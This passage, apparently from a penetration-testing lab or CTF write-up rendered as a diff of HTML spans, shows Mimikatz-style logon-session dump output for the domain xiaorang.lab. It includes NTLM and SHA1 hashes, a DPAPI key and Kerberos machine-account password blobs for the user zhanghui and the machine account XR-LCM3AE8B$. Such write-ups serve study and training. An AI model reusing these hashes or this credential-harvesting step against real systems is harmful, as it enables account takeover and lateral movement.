+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>840082</span> <span class=o>(</span>00000000:000cd192<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : RemoteInteractive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : zhanghui
+</span></span><span class=line><span class=cl>Domain            : XIAORANG
+</span></span><span class=line><span class=cl>Logon Server      : XIAORANG-DC
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:34:32
+</span></span><span class=line><span class=cl>SID               : S-1-5-21-3598443049-773813974-2432140268-1133
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : zhanghui
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1
+</span></span><span class=line><span class=cl>         * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65
+</span></span><span class=line><span class=cl>         * DPAPI    : 4bfe751ae03dc1517cfb688adc506154
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : zhanghui
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : zhanghui
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG.LAB
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>803500</span> <span class=o>(</span>00000000:000c42ac<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-2
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:34:31
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-2
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : f87bbea221c346a6578b5e937f207038
+</span></span><span class=line><span class=cl>         * SHA1     : 318380b6fdd4556d540909a5c86a1bf191b2f0f5
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : 7e <span class=m>84</span> db cc ca <span class=m>73</span> <span class=m>03</span> <span class=m>80</span> f7 <span class=m>29</span> <span class=m>81</span> e8 9a fe 5f f1 <span class=m>22</span> <span class=m>35</span> <span class=m>25</span> bb <span class=m>96</span> 3a <span class=m>28</span> f5 3e e9 e7 <span class=m>09</span> 9f <span class=m>36</span> a4 <span class=m>11</span> b1 <span class=m>77</span> de a6 <span class=m>77</span> <span class=m>48</span> <span class=m>92</span> 8b <span class=m>49</span> <span class=m>49</span> c2 e8 <span class=m>02</span> <span class=m>16</span> <span class=m>89</span> fb <span class=m>33</span> bd b5 2a f7 <span class=m>04</span> <span class=m>62</span> <span class=m>74</span> db 1e c3 ba bd <span class=m>63</span> f8 b0 d1 ec <span class=m>46</span> <span class=m>50</span> 4e <span class=m>04</span> <span class=m>38</span> 6d a7 a4 7e 0d 1a 4d <span class=m>06</span> 5a <span class=m>73</span> 6e <span class=m>11</span> <span class=m>71</span> <span class=m>11</span> e2 7f 9b 8e 7f <span class=m>68</span> 6a 8f <span class=m>23</span> 6e <span class=m>38</span> <span class=m>66</span> a5 <span class=m>76</span> <span class=m>95</span> <span class=m>65</span> 1d 1a <span class=m>38</span> <span class=m>24</span> <span class=nb>fc</span> <span class=m>64</span> e2 ca <span class=m>83</span> c4 <span class=m>87</span> <span class=m>57</span> ec <span class=m>28</span> eb fe <span class=m>15</span> <span class=m>50</span> c1 <span class=m>55</span> b2 <span class=m>22</span> <span class=m>46</span> 1a 2d 7b <span class=m>50</span> d0 <span class=m>71</span> b5 <span class=m>90</span> <span class=m>86</span> <span class=m>90</span> da 4b a8 <span class=m>51</span> 2a <span class=m>85</span> 9b <span class=m>38</span> e0 0f ea 2a <span class=m>67</span> <span class=m>18</span> 3c 8d f4 5e 3a <span class=m>50</span> 2b <span class=m>57</span> b3 <span class=m>55</span> c5 b6 <span class=m>48</span> 5a af 8c 3c f6 f4 <span class=m>09</span> 0e f4 d9 ff f3 3d a2 f7 <span class=m>87</span> eb <span class=m>33</span> <span class=m>02</span> d3 f9 d1 da b7 ac <span class=m>37</span> <span class=m>14</span> 0a <span class=m>50</span> cc 3b ca d1 6f 0a c2 a0 <span class=m>73</span> <span class=m>81</span> <span class=m>75</span> <span class=m>65</span> <span class=m>91</span> <span class=m>85</span> <span class=m>95</span> dd <span class=m>60</span> c6 a9 e1 1f <span class=m>43</span> 9c 4c <span class=m>81</span> <span class=m>91</span> b5 <span class=m>77</span> ed 2d <span class=m>28</span> 5d c8 0f 1a <span class=m>06</span> c8 <span class=m>89</span> <span class=m>44</span> <span class=m>64</span> <span class=m>65</span> <span class=m>11</span> f2 <span class=m>36</span> <span class=m>37</span> <span class=m>13</span> 7c ef 8b <span class=m>56</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>802816</span> <span class=o>(</span>00000000:000c4000<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-2
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:34:31
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-2
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>802032</span> <span class=o>(</span>00000000:000c3cf0<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : UMFD-2
+</span></span><span class=line><span class=cl>Domain            : Font Driver Host
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:34:31
+</span></span><span class=line><span class=cl>SID               : S-1-5-96-0-2
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>997</span> <span class=o>(</span>00000000:000003e5<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Service from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : LOCAL SERVICE
+</span></span><span class=line><span class=cl>Domain            : NT AUTHORITY
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:57
+</span></span><span class=line><span class=cl>SID               : S-1-5-19
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>         * Domain   : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>         * Domain   : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>60359</span> <span class=o>(</span>00000000:0000ebc7<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>1</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-1
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:57
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-1
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : f87bbea221c346a6578b5e937f207038
+</span></span><span class=line><span class=cl>         * SHA1     : 318380b6fdd4556d540909a5c86a1bf191b2f0f5
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : 7e <span class=m>84</span> db cc ca <span class=m>73</span> <span class=m>03</span> <span class=m>80</span> f7 <span class=m>29</span> <span class=m>81</span> e8 9a fe 5f f1 <span class=m>22</span> <span class=m>35</span> <span class=m>25</span> bb <span class=m>96</span> 3a <span class=m>28</span> f5 3e e9 e7 <span class=m>09</span> 9f <span class=m>36</span> a4 <span class=m>11</span> b1 <span class=m>77</span> de a6 <span class=m>77</span> <span class=m>48</span> <span class=m>92</span> 8b <span class=m>49</span> <span class=m>49</span> c2 e8 <span class=m>02</span> <span class=m>16</span> <span class=m>89</span> fb <span class=m>33</span> bd b5 2a f7 <span class=m>04</span> <span class=m>62</span> <span class=m>74</span> db 1e c3 ba bd <span class=m>63</span> f8 b0 d1 ec <span class=m>46</span> <span class=m>50</span> 4e <span class=m>04</span> <span class=m>38</span> 6d a7 a4 7e 0d 1a 4d <span class=m>06</span> 5a <span class=m>73</span> 6e <span class=m>11</span> <span class=m>71</span> <span class=m>11</span> e2 7f 9b 8e 7f <span class=m>68</span> 6a 8f <span class=m>23</span> 6e <span class=m>38</span> <span class=m>66</span> a5 <span class=m>76</span> <span class=m>95</span> <span class=m>65</span> 1d 1a <span class=m>38</span> <span class=m>24</span> <span class=nb>fc</span> <span class=m>64</span> e2 ca <span class=m>83</span> c4 <span class=m>87</span> <span class=m>57</span> ec <span class=m>28</span> eb fe <span class=m>15</span> <span class=m>50</span> c1 <span class=m>55</span> b2 <span class=m>22</span> <span class=m>46</span> 1a 2d 7b <span class=m>50</span> d0 <span class=m>71</span> b5 <span class=m>90</span> <span class=m>86</span> <span class=m>90</span> da 4b a8 <span class=m>51</span> 2a <span class=m>85</span> 9b <span class=m>38</span> e0 0f ea 2a <span class=m>67</span> <span class=m>18</span> 3c 8d f4 5e 3a <span class=m>50</span> 2b <span class=m>57</span> b3 <span class=m>55</span> c5 b6 <span class=m>48</span> 5a af 8c 3c f6 f4 <span class=m>09</span> 0e f4 d9 ff f3 3d a2 f7 <span class=m>87</span> eb <span class=m>33</span> <span class=m>02</span> d3 f9 d1 da b7 ac <span class=m>37</span> <span class=m>14</span> 0a <span class=m>50</span> cc 3b ca d1 6f 0a c2 a0 <span class=m>73</span> <span class=m>81</span> <span class=m>75</span> <span class=m>65</span> <span class=m>91</span> <span class=m>85</span> <span class=m>95</span> dd <span class=m>60</span> c6 a9 e1 1f <span class=m>43</span> 9c 4c <span class=m>81</span> <span class=m>91</span> b5 <span class=m>77</span> ed 2d <span class=m>28</span> 5d c8 0f 1a <span class=m>06</span> c8 <span class=m>89</span> <span class=m>44</span> <span class=m>64</span> <span class=m>65</span> <span class=m>11</span> f2 <span class=m>36</span> <span class=m>37</span> <span class=m>13</span> 7c ef 8b <span class=m>56</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>60309</span> <span class=o>(</span>00000000:0000eb95<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>1</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-1
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:57
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-1
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>996</span> <span class=o>(</span>00000000:000003e4<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Service from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>Domain            : XIAORANG
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:57
+</span></span><span class=line><span class=cl>SID               : S-1-5-20
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
